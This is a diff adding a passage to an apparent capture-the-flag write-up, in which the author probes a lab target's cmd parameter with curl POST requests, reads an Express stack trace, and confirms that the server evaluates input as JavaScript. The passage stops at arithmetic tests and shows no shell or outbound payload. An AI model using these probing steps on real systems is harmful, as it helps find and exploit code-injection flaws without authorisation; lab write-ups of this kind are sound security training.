@@ -204,3 +204,29 @@ ________________________________________________
 cmd                     [Status: 200, Size: 25, Words: 2, Lines: 1]
 :: Progress: [207643/207643] :: Job [1/1] :: 5852 req/sec :: Duration: [0:00:59] :: Errors: 0 ::
 ```
+
+This url takes a cmd parameter with the POST verb. I run it with a few variations to see the results:
+
+```bash
+$ curl -X POST http://target.thm/api/items?cmd=1
+vulnerability_exploited 1
+$ curl -X POST http://target.thm/api/items?cmd=2
+vulnerability_exploited 2
+$ curl -X POST http://target.thm/api/items?cmd=-1
+vulnerability_exploited -1
+$ curl -X POST http://target.thm/api/items?cmd=a
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>ReferenceError: a is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
+</body>
+</html>
+```
+
+It looks like it is parsing the cmd value as if it was a javascript expression. From the stacktrace it looks like it is specifically a node parsing issue.
+
+I entered a few arithmetic expressions for the cmd value, they worked as long as I didn't use the plus sign (+). The plus sign is a special character for url encoding, it represents a space. It seems like the plus sign is becoming a space when the expression is evaluated. To prove this, I used `cmd=70+/+7` and it resulted in a value of 10.
